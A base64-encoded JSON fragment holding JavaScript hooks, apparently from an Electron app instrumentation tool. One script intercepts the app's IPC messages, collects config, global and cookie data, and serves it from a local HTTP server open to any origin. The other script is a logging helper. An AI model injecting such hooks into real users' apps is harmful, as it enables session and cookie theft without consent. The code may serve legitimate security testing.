5zb2xlLmVycm9yKCdbTUFJTi1TRVNTSU9OXSBFcnJvciBjb2xsZWN0aW5nIGdsb2JhbCBkYXRhOicsIGVycik7CiAgICAgICAgICAgIGdsb2JhbERhdGEuZXJyb3IgPSBlcnIubWVzc2FnZTsKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgcmV0dXJuIGdsb2JhbERhdGE7CiAgICB9CiAgICAKICAgIC8vIEludGVyY2VwdCBJUEMgbWVzc2FnZXMgZm9yIHNlc3Npb24gZGF0YQogICAgZnVuY3Rpb24gaW50ZXJjZXB0SVBDKCkgewogICAgICAgIGNvbnN0IGlwY0RhdGEgPSB7CiAgICAgICAgICAgIGNoYW5uZWxzOiBbXSwKICAgICAgICAgICAgbWVzc2FnZXM6IFtdCiAgICAgICAgfTsKICAgICAgICAKICAgICAgICB0cnkgewogICAgICAgICAgICBjb25zdCB7IGlwY01haW4gfSA9IHJlcXVpcmUoJ2VsZWN0cm9uJyk7CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyBHZXQgbGlzdCBvZiBhbGwgcmVnaXN0ZXJlZCBjaGFubmVscyAoaWYgcG9zc2libGUpCiAgICAgICAgICAgIGNvbnN0IG9yaWdpbmFsT24gPSBpcGNNYWluLm9uOwogICAgICAgICAgICBjb25zdCBvcmlnaW5hbEhhbmRsZSA9IGlwY01haW4uaGFuZGxlOwogICAgICAgICAgICAKICAgICAgICAgICAgLy8gV3JhcCBpcGNNYWluLm9uIHRvIGNhcHR1cmUgY2hhbm5lbCBuYW1lcwogICAgICAgICAgICBpcGNNYWluLm9uID0gZnVuY3Rpb24oY2hhbm5lbCwgaGFuZGxlcikgewogICAgICAgICAgICAgICAgaWYgKCFpcGNEYXRhLmNoYW5uZWxzLmluY2x1ZGVzKGNoYW5uZWwpKSB7CiAgICAgICAgICAgICAgICAgICAgaXBjRGF0YS5jaGFubmVscy5wdXNoKGNoYW5uZWwpOwogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKGBbTUFJTi1TRVNTSU9OXSBJUEMgY2hhbm5lbCBkZXRlY3RlZDogJHtjaGFubmVsfWApOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAvLyBXcmFwIGhhbmRsZXIgdG8gY2FwdHVyZSBtZXNzYWdlcwogICAgICAgICAgICAgICAgY29uc3Qgd3JhcHBlZEhhbmRsZXIgPSBmdW5jdGlvbihldmVudCwgLi4uYXJncykgewogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlwY0RhdGEubWVzc2FnZXMucHVzaCh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGFubmVsLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGltZXN0YW1wOiBEYXRlLm5vdygpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgYXJnczogc2FmZUNsb25lKGFyZ3MsIDAsIDIpLCAvLyBMaW1pdGVkIGRlcHRoIGZvciBwZXJmb3JtYW5jZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VuZGVyOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWQ6IGV2ZW50LnNlbmRlci5pZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmw6IGV2ZW50LnNlbmRlci5nZXRVUkwoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIC8vIEtlZXAgb25seSBsYXN0IDEwIG1lc3NhZ2VzIHBlciBjaGFubmVsCiAgICAgICAgICAgICAgICAgICAgICAgIGlwY0RhdGEubWVzc2FnZXMgPSBpcGNEYXRhLm1lc3NhZ2VzLnNsaWNlKC0xMDApOwogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlcnIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgY29uc29sZS5sb2coJ1tNQUlOLVNFU1NJT05dIEVycm9yIGNhcHR1cmluZyBJUEMgbWVzc2FnZTonLCBlcnIubWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIHJldHVybiBoYW5kbGVyLmNhbGwodGhpcywgZXZlbnQsIC4uLmFyZ3MpOwogICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgcmV0dXJuIG9yaWdpbmFsT24uY2FsbCh0aGlzLCBjaGFubmVsLCB3cmFwcGVkSGFuZGxlcik7CiAgICAgICAgICAgIH07CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyBTdG9yZSBJUEMgZGF0YSBpbiBzZXNzaW9uCiAgICAgICAgICAgIHNlc3Npb25EYXRhLmlwYyA9IGlwY0RhdGE7CiAgICAgICAgICAgIAogICAgICAgIH0gY2F0Y2ggKGVycikgewogICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbTUFJTi1TRVNTSU9OXSBFcnJvciBzZXR0aW5nIHVwIElQQyBpbnRlcmNlcHRpb246JywgZXJyKTsKICAgICAgICAgICAgc2Vzc2lvbkRhdGEuaXBjID0geyBlcnJvcjogZXJyLm1lc3NhZ2UgfTsKICAgICAgICB9CiAgICB9CiAgICAKICAgIC8vIENvbGxlY3QgYWxsIHNlc3Npb24gZGF0YQogICAgZnVuY3Rpb24gY29sbGVjdEFsbFNlc3Npb25EYXRhKCkgewogICAgICAgIGNvbnNvbGUubG9nKCdbTUFJTi1TRVNTSU9OXSBDb2xsZWN0aW5nIHNlc3Npb24gZGF0YS4uLicpOwogICAgICAgIAogICAgICAgIGNvbnN0IGRhdGEgPSB7CiAgICAgICAgICAgIHRpbWVzdGFtcDogRGF0ZS5ub3coKSwKICAgICAgICAgICAgY29udGV4dDogJ21haW4nLAogICAgICAgICAgICBicm93c2VyX2RhdGE6IHt9LCAvLyBFbXB0eSBmb3IgbWFpbiBwcm9jZXNzCiAgICAgICAgICAgIGFwcF9kYXRhOiB7CiAgICAgICAgICAgICAgICBlbGVjdHJvbjogY29sbGVjdEVsZWN0cm9uRGF0YSgpLAogICAgICAgICAgICAgICAgY29uZmlnOiBjb2xsZWN0Q29uZmlnRGF0YSgpLAogICAgICAgICAgICAgICAgZ2xvYmFsczogY29sbGVjdEdsb2JhbERhdGEoKSwKICAgICAgICAgICAgICAgIGlwYzogc2Vzc2lvbkRhdGEuaXBjIHx8IHt9LAogICAgICAgICAgICAgICAgY29va2llczogc2Vzc2lvbkRhdGEuY29va2llcyB8fCBbXQogICAgICAgICAgICB9CiAgICAgICAgfTsKICAgICAgICAKICAgICAgICBjb25zb2xlLmxvZygnW01BSU4tU0VTU0lPTl0gU2Vzc2lvbiBkYXRhIGNvbGxlY3Rpb24gY29tcGxldGUnKTsKICAgICAgICByZXR1cm4gZGF0YTsKICAgIH0KICAgIAogICAgLy8gQ3JlYXRlIEhUVFAgc2VydmVyCiAgICBmdW5jdGlvbiBjcmVhdGVIVFRQU2VydmVyKCkgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGNvbnN0IGh0dHAgPSByZXF1aXJlKCdodHRwJyk7CiAgICAgICAgICAgIAogICAgICAgICAgICBzZXJ2ZXIgPSBodHRwLmNyZWF0ZVNlcnZlcigocmVxLCByZXMpID0+IHsKICAgICAgICAgICAgICAgIHJlcy5zZXRIZWFkZXIoJ0FjY2Vzcy1Db250cm9sLUFsbG93LU9yaWdpbicsICcqJyk7CiAgICAgICAgICAgICAgICByZXMuc2V0SGVhZGVyKCdBY2Nlc3MtQ29udHJvbC1BbGxvdy1NZXRob2RzJywgJ0dFVCwgUE9TVCwgT1BUSU9OUycpOwogICAgICAgICAgICAgICAgcmVzLnNldEhlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL2pzb24nKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgKHJlcS5tZXRob2QgPT09ICdPUFRJT05TJykgewogICAgICAgICAgICAgICAgICAgIHJlcy53cml0ZUhlYWQoMjAwKTsKICAgICAgICAgICAgICAgICAgICByZXMuZW5kKCk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBjb25zdCBkYXRhID0gY29sbGVjdEFsbFNlc3Npb25EYXRhKCk7CiAgICAgICAgICAgICAgICBjb25zdCBqc29uU3RyaW5nID0gc2FmZVN0cmluZ2lmeShkYXRhKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgcmVzLndyaXRlSGVhZCgyMDApOwogICAgICAgICAgICAgICAgcmVzLmVuZChqc29uU3RyaW5nKTsKICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIAogICAgICAgICAgICBzZXJ2ZXIubGlzdGVuKFBPUlQsICcxMjcuMC4wLjEnLCAoKSA9PiB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhgW01BSU4tU0VTU0lPTl0g4pyTIEhUVFAgc2VydmVyIHJ1bm5pbmcgb24gaHR0cDovLzEyNy4wLjAuMToke1BPUlR9YCk7CiAgICAgICAgICAgIH0pOwogICAgICAgICAgICAKICAgICAgICAgICAgc2VydmVyLm9uKCdlcnJvcicsIChlcnIpID0+IHsKICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tNQUlOLVNFU1NJT05dIFNlcnZlciBlcnJvcjonLCBlcnIpOwogICAgICAgICAgICB9KTsKICAgICAgICAgICAgCiAgICAgICAgICAgIHJldHVybiBzZXJ2ZXI7CiAgICAgICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tNQUlOLVNFU1NJT05dIEZhaWxlZCB0byBjcmVhdGUgSFRUUCBzZXJ2ZXI6JywgZXJyKTsKICAgICAgICAgICAgcmV0dXJuIG51bGw7CiAgICAgICAgfQogICAgfQogICAgCiAgICAvLyBJbml0aWFsaXplCiAgICBmdW5jdGlvbiBpbml0aWFsaXplKCkgewogICAgICAgIGNvbnNvbGUubG9nKCdbTUFJTi1TRVNTSU9OXSBJbml0aWFsaXppbmcgbWFpbiBwcm9jZXNzIHNlc3Npb24gZXh0cmFjdG9yLi4uJyk7CiAgICAgICAgCiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgLy8gQ3JlYXRlIEhUVFAgc2VydmVyCiAgICAgICAgICAgIHNlcnZlciA9IGNyZWF0ZUhUVFBTZXJ2ZXIoKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIC8vIFNldCB1cCBJUEMgaW50ZXJjZXB0aW9uCiAgICAgICAgICAgIGludGVyY2VwdElQQygpOwogICAgICAgICAgICAKICAgICAgICAgICAgLy8gQ29sbGVjdCBpbml0aWFsIGRhdGEKICAgICAgICAgICAgc2Vzc2lvbkRhdGEgPSBjb2xsZWN0QWxsU2Vzc2lvbkRhdGEoKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIGNvbnNvbGUubG9nKCdbTUFJTi1TRVNTSU9OXSA9PT0gSU5JVElBTElaQVRJT04gQ09NUExFVEUgPT09Jyk7CiAgICAgICAgICAgIGNvbnNvbGUubG9nKGBbTUFJTi1TRVNTSU9OXSBBY2Nlc3Mgc2Vzc2lvbiBkYXRhIGF0OiBodHRwOi8vMTI3LjAuMC4xOiR7UE9SVH1gKTsKICAgICAgICAgICAgCiAgICAgICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tNQUlOLVNFU1NJT05dIEluaXRpYWxpemF0aW9uIGZhaWxlZDonLCBlcnIpOwogICAgICAgIH0KICAgIH0KICAgIAogICAgLy8gU3RhcnQgaW1tZWRpYXRlbHkKICAgIGluaXRpYWxpemUoKTsKICAgIAp9KSgpOyAK","utils.js":"Ly8gU2hhcmVkIGxvZ2dpbmcgdXRpbGl0eSBmb3IgYWxsIGhvb2tzCihmdW5jdGlvbigpIHsKICAgIGNvbnN0IGNyeXB0byA9IHJlcXVpcmUoJ2NyeXB0bycpOwogICAgY29uc3QgZnMgPSByZXF1aXJlKCdmcycpOwogICAgY29uc3QgcGF0aCA9IHJlcXVpcmUoJ3BhdGgnKTsKICAgIGNvbnN0IG9zID0gcmVxdWlyZSgnb3MnKTsKCiAgICAvLyBHZW5lcmF0ZSBzZXNzaW9uIElEIGZyb20gdGFyZ2V0IHBhdGgKICAgIGZ1bmN0aW9uIGdlbmVyYXRlU2Vzc2lvbklkKHRhcmdldFBhdGgpIHsKICAgICAgICByZXR1cm4gY3J5cHRvLmNyZWF0ZUhhc2goJ3NoYTI1NicpCiAgICAgICAgICAgIC51cGRhdGUodGFyZ2V0UGF0aCkKICAgICAgICAgICAgLmRpZ2VzdCgnaGV4JykKICAgICAgICAgICAgLnN1YnN0cmluZygwLCA4KTsKICAgIH0KCiAgICAvLyBHZXQgbG9nIGRpcmVjdG9yeSBmb3IgY3VycmVudCBzZXNzaW9uCiAgICBmdW5jdGlvbiBnZXRMb2dEaXIodGFyZ2V0UGF0aCkgewogICAgICAgIGNvbnN0IHNlc3Npb25JZCA9IGdlbmVyYXRlU2Vzc2lvbklkKHRhcmdldFBhdGgpOwogICAgICAgIGNvbnN0IGxvZ0RpciA9IHBhdGguam9pbihvcy5ob21lZGlyKCksICcubG9jYWwnLCAnaGFkcm9uJywgJ2xvZ3MnLCBzZXNzaW9uSWQpOwogICAgICAgIAogICAgICAgIC8vIEVuc3VyZSBsb2cgZGlyZWN0b3J5IGV4aXN0cwogICAgICAgIGlmICghZnMuZXhpc3RzU3luYyhsb2dEaXIpKSB7CiAgICAgICAgICAgIGZzLm1rZGlyU3luYyhsb2dEaXIsIHsgcmVjdXJzaXZlOiB0cnVlIH0pOwogICAgICAgIH0KICAgICAgICAKICAgICAgICByZXR1cm4gbG9nRGlyOwogICAgfQoKICAgIC8vIENyZWF0ZSBsb2dnZXIgZm9yIGEgc3BlY2lmaWMgaG9vawogICAgZnVuY3Rpb24gY3JlYXRlTG9nZ2VyKHRhcmdldFBhdGgsIGhvb2tOYW1lKSB7CiAgICAgICAgY29uc3QgbG9nRGlyID0gZ2V0TG9nRGlyKHRhcmdldFBhdGgpOwogICAgICAgIGNvbnN0IGxvZ0ZpbGUgPSBwYXRoLmpvaW4obG9nRGlyLCBgJHtob29rTmFtZX0uanNvbmApOwogICAgICAgIAogICAgICAgIHJldHVybiB7CiAgICAgICAgICAgIGxvZzogKGRhdGEpID0+IHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgdGltZXN0YW1wID0gbmV3IERhdGUoKS50b0lTT1N0cmluZygpOwogICAgICAgICAgICAgICAgICAgIGNvbnN0IGxvZ0VudHJ5ID0gewogICAgICAgICAgICAgICAgICAgICAgICB0aW1lc3RhbXAsCiAgICAgICAgICAgICAgICAgICAgICAgIGhvb2s6IGhvb2tOYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAuLi5kYXRhCiAgICAgICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgICAgICBmcy5hcHBlbmRGaWxlU3luYyhsb2dGaWxlLCBKU09OLnN0cmluZ2lmeShsb2dFbnRyeSkgKyAnXG4nKTsKICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhgWyR7aG9va05hbWV9XWAsIGRhdGEpOyAvLyBBbHNvIGxvZyB0byBjb25zb2xlCiAgICAgICAgICAgICAgICB9IGNhdGNoKGUpIHsKICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKGBbJHtob29rTmFtZX1dIExvZyBlcnJvcjpgLCBlLm1lc3NhZ2UpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9LAogICAgICAgICAgICAKICAgICAgICAgICAgLy8gR2V0IHNlc3Npb24gaW5mbwogICAgICAgICAgICBnZXRTZXNzaW9uSW5mbzogKCkgPT4gewogICAgICAgICAgICAgICAgcmV0dXJuIHsKICAgICAgICAgICAgICAgICAgICBzZXNzaW9uSWQ6IGdlbmVyYXRlU2Vzc2lvbklkKHRhcmdldFBhdGgpLAogICAgICAgICAgICAgICAgICAgIGxvZ0RpciwKICAgICAgICAgICAgICAgICAgICB0YXJnZXRQYXRoCiAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICB9CiAgICAgICAgfTsKICAgIH0KCiAgICAvLyBFeHBvcnQgdGhlIHV0aWxpdHkKICAgIGlmICh0eXBlb2YgbW9kdWxlICE9PSAndW5kZWZpbmVkJykgewogICAgICAgIG1vZHVsZS5leHBvcnRzID0gewogICAgICAgICAgICBjcmVhdGVMb2dnZXIsCiAgICAgICAgICAgIGdldExvZ0RpciwKICAgICAgICAgICAgZ2VuZXJhdGVTZXNzaW9uSWQKICAgICAgICB9OwogICAgfSBlbHNlIHsKICAgICAgICB3aW5kb3cuX19IQURST05fTE9HR0VSX18gPSB7CiAgICAgICAgICAgIGNyZWF0ZUxvZ2dlciwKICAgICAgICAgICAgZ2V0TG9nRGlyLAogICAgICAgICAgICBnZW5lcmF0ZVNlc3Npb25JZAogICAgICAgIH07CiAgICB9Cn0pKCk7IA=="}